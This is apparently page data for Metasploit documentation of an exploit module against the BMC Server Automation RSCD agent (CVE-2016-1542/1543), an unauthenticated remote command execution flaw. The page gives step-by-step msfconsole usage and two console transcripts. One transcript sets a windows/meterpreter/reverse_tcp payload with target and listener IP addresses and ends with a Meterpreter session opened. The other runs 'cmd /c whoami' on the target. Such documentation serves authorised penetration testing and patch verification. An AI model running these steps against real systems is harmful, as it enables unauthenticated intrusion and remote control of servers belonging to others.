{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/bmc_server_automation_rscd_nsh_rce","result":{"data":{"moduleMetadataJson":{"id":"2d0f38f2-feaf-5b7c-8d49-e6132d0c42e6","name":"BMC Server Automation RSCD Agent NSH Remote Command Execution","fullname":"exploit/multi/misc/bmc_server_automation_rscd_nsh_rce","description":"This module exploits a weak access control check in the BMC Server\n        Automation RSCD agent that allows arbitrary operating system commands\n        to be executed without authentication.\n        Note: Under Windows, non-powershell commands may need to be prefixed\n              with 'cmd /c'.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/bmc_server_automation_rscd_nsh_rce","documentationSlug":"/modules/documentation/exploit/multi/misc/bmc_server_automation_rscd_nsh_rce"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>This module exploits a weak access control check in the BMC Server Automation RSCD agent that allows arbitrary operating system commands to be executed without authentication.</p>\n<p>Affected versions of the BMC RSCD agent fail to enforce authentication controls at the server side enabling a rogue client to send an authentication message, ignore the response, and continue interacting with the agent as though the authentication was successful. This module takes advantage of this vulnerability to execute arbitrary operating system commands using the BMC network shell (NSH) functionality.</p>\n<p>The access control vulnerability itself was identified by Olga Yanushkevich of <a href=\"https://www.ernw.de/\">ERNW</a> and was assigned <a href=\"https://www.cvedetails.com/cve/CVE-2016-1542/\">CVE-2016-1542</a> and <a href=\"https://www.cvedetails.com/cve/CVE-2016-1543/\">CVE-2016-1543</a>. Further details can be found at the <a href=\"https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/\">ERNW Insinuator website</a>.</p>\n<p>Technical details of the RCE exploit can be found <a href=\"https://nickbloor.co.uk/2018/01/01/rce-with-bmc-server-automation/\">here</a> and <a href=\"https://nickbloor.co.uk/2018/01/08/improving-the-bmc-rscd-rce-exploit/\">here</a>.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The module affects the RSCD agent component of <a href=\"http://www.bmcsoftware.uk/it-solutions/bladelogic-server-automation.html\">BMC BladeLogic Server Automation</a>. The agent is installed on servers managed using BMC BladeLogic Server Automation and listens on TCP port 4750. The vulnerability affects versions 8.x below 8.6 SP1 Patch 2, 8.7 Patch 3, and 8.8. More details on affected versions and the fix can be found from the <a href=\"https://selfservice.bmc.com/casemgmt/sc_KnowledgeArticle?sfdcid=kA214000000dBpnCAE&#x26;type=Solution\">BMC Knowledgebase</a>.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To use this exploit you will need access to BMC BladeLogic Server Automation.</p>\n<ol>\n<li>Install the RSCD agent on a host as detailed in the <a href=\"https://docs.bmc.com/docs/ServerAutomation/89/agent-installation-overview-653394992.html\">BMC documentation</a>.</li>\n<li>Ensure that the RSCD service is running and listening on TCP port 4750.</li>\n<li>Launch <code class=\"language-text\">msfconsole</code>.</li>\n<li>Load the module <code class=\"language-text\">use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce</code>.</li>\n<li>Select the generic command target <code class=\"language-text\">set target 3</code>.</li>\n<li>Select a generic command payload <code class=\"language-text\">set payload cmd/unix/generic</code> or <code class=\"language-text\">set payload cmd/windows/generic</code>.</li>\n<li>Set the command to execute <code class=\"language-text\">set CMD &quot;echo MSF&quot;</code> or <code class=\"language-text\">set CMD &quot;cmd /c echo MSF&quot;</code>.</li>\n<li>Run the exploit <code class=\"language-text\">exploit</code>.</li>\n</ol>\n<p>The result should be that the string <code class=\"language-text\">MSF</code> is returned and output.</p>\n<h2 id=\"usage-scenarios\" style=\"position:relative;\"><a href=\"#usage-scenarios\" aria-label=\"usage scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage Scenarios</h2>\n<p>The exploit module contains several targets as detailed below.</p>\n<h3 id=\"target-0-automatic\" style=\"position:relative;\"><a href=\"#target-0-automatic\" aria-label=\"target 0 automatic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 0: Automatic</h3>\n<p>The automatic target causes the module to issue an <code class=\"language-text\">agentinfo</code> request to the target in an attempt to identify the target operating system. If it appears to be a Windows target then the module behaves as though target 1 was selected, otherwise it behaves as though target 2 was selected.</p>\n<h3 id=\"target-1-windowsvbs-stager\" style=\"position:relative;\"><a href=\"#target-1-windowsvbs-stager\" aria-label=\"target 1 windowsvbs stager permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 1: Windows/VBS Stager</h3>\n<p>This module target provides support for command staging to enable arbitrary Metasploit payloads to be used against Windows targets (for example, a Meterpreter shell).</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set RHOST 34.239.181.84\nRHOST =&gt; 34.239.181.84\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set LHOST 54.164.112.135\nLHOST =&gt; 54.164.112.135\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set TARGET 1\nTARGET =&gt; 1\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; exploit\n[*] Exploit running as background job 1.\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt;\n[*] Started reverse TCP handler on 0.0.0.0:4444\n[*] 34.239.181.84:4750 - Command Stager progress -   8.01% done (8099/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  16.03% done (16198/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  24.04% done (24297/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  32.06% done (32396/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  40.07% done (40495/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  48.09% done (48594/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  56.10% done (56693/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  64.11% done (64792/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  72.13% done (72891/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  80.14% done (80990/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  88.16% done (89089/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress -  96.17% done (97188/101056 bytes)\n[*] 34.239.181.84:4750 - Command Stager progress - 100.00% done (101056/101056 bytes)\n[*] Sending stage (179779 bytes) to 34.239.181.84\n[*] Meterpreter session 1 opened (172.31.58.107:4444 -&gt; 34.239.181.84:56233) at 2018-01-14 00:54:49 +0000</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"target-2-unixlinux\" style=\"position:relative;\"><a href=\"#target-2-unixlinux\" aria-label=\"target 2 unixlinux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 2: Unix/Linux</h3>\n<p>This module target provides support for command staging to enable arbitrary Metasploit payloads to be used against Unix/Linux targets in the same way as target 1.</p>\n<h3 id=\"target-3-generic-cmd\" style=\"position:relative;\"><a href=\"#target-3-generic-cmd\" aria-label=\"target 3 generic cmd permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Target 3: Generic Cmd</h3>\n<p>This target can be used with <em>cmd</em> payloads to execute operating system commands against the target host.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set RHOST 34.239.181.84\nRHOST =&gt; 34.239.181.84\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set TARGET 3\nTARGET =&gt; 3\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set PAYLOAD cmd/windows/generic\nPAYLOAD =&gt; cmd/windows/generic\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; set CMD &quot;cmd /c whoami&quot;\nCMD =&gt; cmd /c whoami\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt; exploit\n[*] Exploit running as background job 2.\nmsf exploit(multi/misc/bmc_server_automation_rscd_nsh_rce) &gt;\n[+] 34.239.181.84:4750 - Output\nip-ac1f1eb2\\bladelogicrscd</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"windows-hosts\" style=\"position:relative;\"><a href=\"#windows-hosts\" aria-label=\"windows hosts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows Hosts</h4>\n<p>When using this module target against Windows hosts, non-powershell command lines are limited to around 8,100 characters and generally have to be prefixed with <code class=\"language-text\">cmd /c</code>.\nPowershell commands are executed differently and have a much larger length limit of around 32,700 characters.</p>"}}},"pageContext":{"id":"2d0f38f2-feaf-5b7c-8d49-e6132d0c42e6"}}}